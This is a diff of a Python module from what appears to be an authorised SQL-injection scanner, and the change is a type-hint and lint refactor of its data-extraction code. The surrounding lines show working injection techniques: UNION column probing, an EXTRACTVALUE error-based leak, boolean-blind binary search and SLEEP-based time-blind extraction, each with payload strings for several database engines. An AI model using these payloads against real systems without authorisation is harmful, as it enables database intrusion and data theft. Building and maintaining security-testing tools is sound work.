@@ -34,16 +34,13 @@ from __future__ import annotations
 
 import re
 import time
-import statistics
-import secrets
+from collections.abc import Callable
 from dataclasses import dataclass, field
-from typing import Callable, Dict, List, Optional, Tuple
 from difflib import SequenceMatcher
 from urllib.parse import urlparse
 
-from .sender import send, SendResult
-from .fingerprint import fingerprint_response
 from .detector_deep import DeepFinding
+from .sender import send
 
 
 # ── auth gate ────────────────────────────────────────────────
@@ -75,11 +72,11 @@ def _assert_readonly(payload: str) -> None:
 @dataclass
 class ExtractCell:
     label: str
-    value: Optional[str] = None
+    value: str | None = None
     technique: str = ""              # union|error|boolean|time
     requests: int = 0
     duration_s: float = 0.0
-    error: Optional[str] = None
+    error: str | None = None
     confidence: str = "unknown"      # unknown|inferred|verified
 
     def ok(self) -> bool:
@@ -94,24 +91,24 @@ class ExtractionReport:
     inject_in: str
     dbms: str
     technique_used: str
-    banner:          Optional[ExtractCell] = None
-    version:         Optional[ExtractCell] = None
-    current_user:    Optional[ExtractCell] = None
-    current_db:      Optional[ExtractCell] = None
-    databases:       List[str] = field(default_factory=list)
-    tables:          Dict[str, List[str]] = field(default_factory=dict)   # {db: [table,...]}
-    columns:         Dict[str, List[str]] = field(default_factory=dict)   # {"db.table":[col,...]}
-    sample_rows:     Dict[str, List[Dict[str, str]]] = field(default_factory=dict)
+    banner:          ExtractCell | None = None
+    version:         ExtractCell | None = None
+    current_user:    ExtractCell | None = None
+    current_db:      ExtractCell | None = None
+    databases:       list[str] = field(default_factory=list)
+    tables:          dict[str, list[str]] = field(default_factory=dict)   # {db: [table,...]}
+    columns:         dict[str, list[str]] = field(default_factory=dict)   # {"db.table":[col,...]}
+    sample_rows:     dict[str, list[dict[str, str]]] = field(default_factory=dict)
     total_requests:  int = 0
     duration_s:      float = 0.0
-    log:             List[str] = field(default_factory=list)
-    errors:          List[str] = field(default_factory=list)
+    log:             list[str] = field(default_factory=list)
+    errors:          list[str] = field(default_factory=list)
     refused:         bool = False
 
 
 # ── per-DBMS query book ─────────────────────────────────────
 # Each returns a SQL EXPRESSION (single value) suitable for union/error/blind.
-QUERIES: Dict[str, Dict[str, str]] = {
+QUERIES: dict[str, dict[str, str]] = {
     "mysql": {
         "banner":       "@@version",
         "version":      "VERSION()",
@@ -185,7 +182,7 @@ def _quote(dbms: str, s: str) -> str:
 # ── UNION technique ─────────────────────────────────────────
 def _union_probe_columns(url: str, method: str, param: str, inject_in: str,
                          baseline_body: str, max_cols: int = 12,
-                         rate_ms: int = 150) -> Optional[int]:
+                         rate_ms: int = 150) -> int | None:
     """Return column count where UNION SELECT NULL,... reflects in body."""
     for n in range(1, max_cols + 1):
         payload = "' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
@@ -199,7 +196,7 @@ def _union_probe_columns(url: str, method: str, param: str, inject_in: str,
 
 
 def _union_extract_expr(url: str, method: str, param: str, inject_in: str,
-                        dbms: str, expr: str, cols: int, rate_ms: int) -> Optional[str]:
+                        dbms: str, expr: str, cols: int, rate_ms: int) -> str | None:
     """Inject expr into each column slot; return first captured value between markers."""
     a, b = "H4B<<", ">>4H4"
     a_hex = "0x" + a.encode().hex()
@@ -231,7 +228,7 @@ def _union_extract_expr(url: str, method: str, param: str, inject_in: str,
 
 # ── ERROR technique ─────────────────────────────────────────
 def _error_extract_expr(url: str, method: str, param: str, inject_in: str,
-                        dbms: str, expr: str, rate_ms: int) -> Optional[str]:
+                        dbms: str, expr: str, rate_ms: int) -> str | None:
     """Force a type-cast error that leaks the value in the error message."""
     if dbms in ("mysql", "mariadb"):
         payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -"
@@ -270,23 +267,25 @@ def _error_extract_expr(url: str, method: str, param: str, inject_in: str,
 # ── BOOLEAN-blind (binary search per char) ──────────────────
 def _boolean_length_probe(url: str, method: str, param: str, inject_in: str,
                           dbms: str, expr: str, baseline_body: str,
-                          rate_ms: int, req_counter: List[int],
-                          max_probe: int = 128) -> Optional[int]:
+                          rate_ms: int, req_counter: list[int],
+                          max_probe: int = 128) -> int | None:
     """
     Binary-search LENGTH(expr) so extraction stops at the true end instead of
     converging on ASCII 32 (space) for out-of-bounds positions.
     Returns None if length probe unusable (e.g. all responses look identical).
     """
     if dbms in ("mysql", "mariadb"):
-        len_fn = lambda expr: f"LENGTH(({expr}))"
+        def len_fn(expr):
+            return f"LENGTH(({expr}))"
     elif dbms == "postgresql":
-        len_fn = lambda expr: f"LENGTH(({expr})::text)"
+        def len_fn(expr):
+            return f"LENGTH(({expr})::text)"
     elif dbms == "mssql":
-        len_fn = lambda expr: f"LEN(CAST(({expr}) AS VARCHAR(4000)))"
-    elif dbms == "sqlite":
-        len_fn = lambda expr: f"LENGTH(({expr}))"
-    elif dbms == "oracle":
-        len_fn = lambda expr: f"LENGTH(({expr}))"
+        def len_fn(expr):
+            return f"LEN(CAST(({expr}) AS VARCHAR(4000)))"
+    elif dbms == "sqlite" or dbms == "oracle":
+        def len_fn(expr):
+            return f"LENGTH(({expr}))"
     else:
         return None
 
@@ -310,7 +309,7 @@ def _boolean_length_probe(url: str, method: str, param: str, inject_in: str,
 
 def _boolean_char_at(url: str, method: str, param: str, inject_in: str,
                      dbms: str, expr: str, pos: int, baseline_body: str,
-                     rate_ms: int, req_counter: List[int]) -> Optional[int]:
+                     rate_ms: int, req_counter: list[int]) -> int | None:
     """Binary-search ASCII of char #pos (1-indexed) of expr."""
     lo, hi = 32, 126
     while lo < hi:
@@ -344,7 +343,7 @@ def _boolean_char_at(url: str, method: str, param: str, inject_in: str,
 
 def _boolean_extract_expr(url: str, method: str, param: str, inject_in: str,
                           dbms: str, expr: str, baseline_body: str,
-                          max_len: int, rate_ms: int) -> Tuple[Optional[str], int]:
+                          max_len: int, rate_ms: int) -> tuple[str | None, int]:
     """Bin-search each char until true length reached, char is nonprintable, or max_len."""
     out = []
     req_counter = [0]
@@ -366,7 +365,7 @@ def _boolean_extract_expr(url: str, method: str, param: str, inject_in: str,
 def _time_char_at(url: str, method: str, param: str, inject_in: str,
                   dbms: str, expr: str, pos: int, baseline_ms: int,
                   threshold_s: float, rate_ms: int,
-                  req_counter: List[int]) -> Optional[int]:
+                  req_counter: list[int]) -> int | None:
     """Extract ASCII of char #pos by testing each bit → sleep-if-set."""
     if dbms in ("mysql", "mariadb"):
         sleep_fn = "SLEEP({s})"
@@ -418,7 +417,7 @@ def _time_char_at(url: str, method: str, param: str, inject_in: str,
 def _time_extract_expr(url: str, method: str, param: str, inject_in: str,
                        dbms: str, expr: str, baseline_ms: int,
                        max_len: int, rate_ms: int,
-                       threshold_s: float = 3.0) -> Tuple[Optional[str], int]:
+                       threshold_s: float = 3.0) -> tuple[str | None, int]:
     out = []
     req_counter = [0]
     for pos in range(1, max_len + 1):
@@ -432,11 +431,10 @@ def _time_extract_expr(url: str, method: str, param: str, inject_in: str,
 # ── technique dispatcher ────────────────────────────────────
 def _extract_one(url: str, method: str, param: str, inject_in: str,
                  dbms: str, expr: str, technique: str,
-                 baseline_body: str, baseline_ms: int, cols: Optional[int],
+                 baseline_body: str, baseline_ms: int, cols: int | None,
                  max_len: int, rate_ms: int,
-                 threshold_s: float) -> Tuple[Optional[str], int, str]:
+                 threshold_s: float) -> tuple[str | None, int, str]:
     """Route to chosen technique. Return (value, requests_fired, technique_used)."""
-    t0 = time.perf_counter()
     val, req = None, 0
     if technique == "union" and cols:
         val = _union_extract_expr(url, method, param, inject_in, dbms, expr, cols, rate_ms)
@@ -465,12 +463,12 @@ def _pick_technique(finding: DeepFinding) -> str:
 # ── main extraction entrypoint ──────────────────────────────
 def deep_extract(finding: DeepFinding,
                  auth_token: str,
-                 targets: Optional[List[str]] = None,
+                 targets: list[str] | None = None,
                  max_len_per_field: int = 64,
                  rate_limit_ms: int = 200,
                  max_total_requests: int = 800,
-                 abort: Optional[Callable[[], bool]] = None,
-                 progress: Optional[Callable[[str], None]] = None) -> ExtractionReport:
+                 abort: Callable[[], bool] | None = None,
+                 progress: Callable[[str], None] | None = None) -> ExtractionReport:
     """
     Run deep extraction against a confirmed DeepFinding.
 
@@ -520,13 +518,13 @@ def deep_extract(finding: DeepFinding,
     # column count for UNION
     cols = None
     if report.technique_used == "union":
-        log(f"[extract] probing column count (UNION)")
+        log("[extract] probing column count (UNION)")
         cols = _union_probe_columns(finding.url, finding.method, finding.param,
                                     finding.inject_in, baseline_body,
                                     max_cols=12, rate_ms=rate_limit_ms)
         report.total_requests += 12  # conservative
         if not cols:
-            log(f"[extract] union column probe failed → falling back to boolean")
+            log("[extract] union column probe failed → falling back to boolean")
             report.technique_used = "boolean"
 
     q = QUERIES[dbms]
